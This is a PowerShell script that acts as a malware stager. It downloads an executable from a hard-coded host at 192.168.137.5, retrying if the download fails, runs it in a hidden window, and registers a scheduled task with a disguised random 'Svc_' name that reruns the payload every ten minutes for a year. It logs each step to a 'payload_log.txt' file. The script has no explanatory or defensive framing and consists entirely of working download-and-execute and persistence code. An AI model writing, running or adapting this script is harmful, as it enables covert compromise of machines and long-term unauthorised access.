& {
    $logFile = "$env:TEMP\payload_log.txt"
    $maxRetries = 5
    $retryDelay = 3
    Add-Content $logFile "=== Script execution started at $(Get-Date) ==="

    # Download client with retry logic
    $clientUrl = "http://192.168.137.5:8080/download/client.exe"
    $clientPath = "$env:TEMP\client_$(Get-Random).exe"
    $downloadSuccess = $false
    $retryCount = 0

    while ($retryCount -lt $maxRetries -and -not $downloadSuccess) {
        try {
            $wc = New-Object System.Net.WebClient
            $wc.Timeout = 15000  # 15 second timeout
            $wc.DownloadFile($clientUrl, $clientPath)
            
            # Verify file exists and has content
            if ((Test-Path $clientPath) -and (Get-Item $clientPath).Length -gt 0) {
                Add-Content $logFile "[SUCCESS] Downloaded client.exe ($(Get-Item $clientPath).Length bytes)"
                $downloadSuccess = $true
            } else {
                Add-Content $logFile "[WARN] Downloaded file is invalid or empty"
                Remove-Item $clientPath -Force -ErrorAction SilentlyContinue
                $retryCount++
                Start-Sleep -Seconds $retryDelay
            }
        } catch {
            $retryCount++
            Add-Content $logFile "[ERROR] Download attempt $retryCount failed: $($_.Exception.Message)"
            if ($retryCount -lt $maxRetries) {
                Start-Sleep -Seconds $retryDelay
            }
        }
    }

    if (-not $downloadSuccess) {
        Add-Content $logFile "[FATAL] Failed to download after $maxRetries attempts"
        exit 1
    }

    # Run the client (hidden)
    try {
        $process = Start-Process $clientPath -WindowStyle Hidden -PassThru
        Add-Content $logFile "[SUCCESS] Started client.exe (PID: $($process.Id))"
        Start-Sleep -Seconds 2
        
        if ($process.HasExited) {
            Add-Content $logFile "[WARN] Client exited unexpectedly with code $($process.ExitCode)"
        }
    } catch {
        Add-Content $logFile "[ERROR] Failed to start client: $($_.Exception.Message)"
        Remove-Item $clientPath -Force -ErrorAction SilentlyContinue
        exit 1
    }

    # Create persistence with error handling
    try {
        $taskName = "Svc_$(Get-Random -Minimum 100000 -Maximum 999999)"
        $taskAction = New-ScheduledTaskAction -Execute $clientPath
        $taskTrigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration (New-TimeSpan -Days 365)
        Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Force -ErrorAction Stop | Out-Null
        Add-Content $logFile "[SUCCESS] Persistence added: $taskName"
    } catch {
        Add-Content $logFile "[WARN] Could not create scheduled task (may require admin): $($_.Exception.Message)"
    }

    Add-Content $logFile "=== Script execution completed at $(Get-Date) ==="
    Add-Content $logFile ""
}